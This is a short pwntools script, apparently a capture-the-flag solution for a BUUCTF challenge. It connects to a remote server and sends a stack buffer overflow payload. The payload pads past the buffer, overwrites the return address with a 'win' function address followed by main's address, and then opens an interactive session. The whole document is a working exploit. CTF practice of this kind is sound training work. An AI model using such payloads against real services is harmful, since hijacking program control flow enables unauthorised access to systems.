from pwn import *

r = remote('node5.buuoj.cn', 29948)

context.log_level = 'debug'

win_addr = 0x80485CB
main_addr = 0x0804865D

payload = b'A' * (0x28 + 4) + p32(win_addr) + p32(main_addr)
r.sendlineafter(b'string: ', payload)
r.interactive()
